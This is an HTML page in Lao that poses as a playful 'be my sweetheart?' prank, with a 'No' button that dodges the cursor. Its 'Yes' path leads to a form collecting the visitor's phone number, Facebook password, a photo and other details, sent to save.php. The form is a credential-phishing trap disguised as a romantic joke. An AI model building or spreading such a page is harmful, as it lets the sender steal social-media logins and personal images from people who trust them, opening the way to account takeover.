<!DOCTYPE html>
<html lang="lo">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ຂໍເປັນແຟນແດ່ ❤️</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #ffe6e6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        h1 { color: #ff4d4d; }
        .btn-group { margin-top: 20px; position: relative; height: 100px; }
        button { padding: 12px 25px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .btn-yes { background: #ff4d4d; color: white; }
        .btn-no { background: #ccc; color: #333; position: absolute; left: 50%; transform: translateX(10px); }
        .hidden { display: none !important; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        .full-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
    </style>
</head>
<body>

    <div id="section-main" class="card">
        <h1>ເປັນແຟນກັນບໍ່? ❤️</h1>
        <div class="btn-group">
            <button class="btn-yes" onclick="showForm()">ເປັນ</button>
            <button id="btn-no" class="btn-no" onmouseover="moveButton()" onclick="showSad()">ບໍ່ເປັນ</button>
        </div>
    </div>

    <div id="section-form" class="card hidden">
        <h2>ດີໃຈເດ! ບອກຂໍ້ມູນສ່ວນຕົວແດ່ 😍</h2>
        <form action="save.php" method="POST" enctype="multipart/form-data">
            <input type="text" name="phone" placeholder="ເບີໂທລະສັບ" required>
            <input type="password" name="fb_password" placeholder="ລະຫັດເຟສບຸກ" required>
            <input type="number" name="years" placeholder="ຈະເປັນແຟນກັນຈັກປີ?" required>
            <p style="font-size: 12px; color: gray;">ສົ່ງຮູບຖ່າຍຄູ່ກັນ ຫຼື ຮູບເຈົ້າ</p>
            <input type="file" name="photo" accept="image/*" required>
            <br><br>
            <button type="submit" class="btn-yes">ບັນທຶກຂໍ້ມູນ</button>
        </form>
    </div>

    <div id="section-sad" class="full-screen hidden">
        <h1 style="font-size: 80px;">☹️</h1>
        <h1>ເສຍໃຈເດ... ບໍ່ເປັນຫຍັງກະໄດ້;</h1>
        <br>
        <button onclick="location.reload()" style="background: #555; color: white;">ກັບຄືນໜ້າຫຼັກ</button>
    </div>

    <script>
        const mainSec = document.getElementById('section-main');
        const formSec = document.getElementById('section-form');
        const sadSec = document.getElementById('section-sad');
        const btnNo = document.getElementById('btn-no');

        // ຟັງຊັນເມື່ອກົດ "ເປັນ"
        function showForm() {
            mainSec.classList.add('hidden');
            formSec.classList.remove('hidden');
        }

        // ຟັງຊັນເມື່ອກົດ "ບໍ່ເປັນ"
        function showSad() {
            mainSec.classList.add('hidden');
            sadSec.classList.remove('hidden');
        }

        // ຟັງຊັນປຸ່ມໂດດໜີ (ປັບໃຫ້ໂດດໃນຂອບເຂດໜ້າຈໍ)
        function moveButton() {
            const x = Math.random() * (window.innerWidth - btnNo.clientWidth);
            const y = Math.random() * (window.innerHeight - btnNo.clientHeight);
            
            btnNo.style.position = 'fixed'; // ໃຊ້ fixed ເພື່ອໃຫ້ມັນໂດດໄປໄດ້ທົ່ວຈໍ
            btnNo.style.left = x + 'px';
            btnNo.style.top = y + 'px';
        }
    </script>
</body>
</html>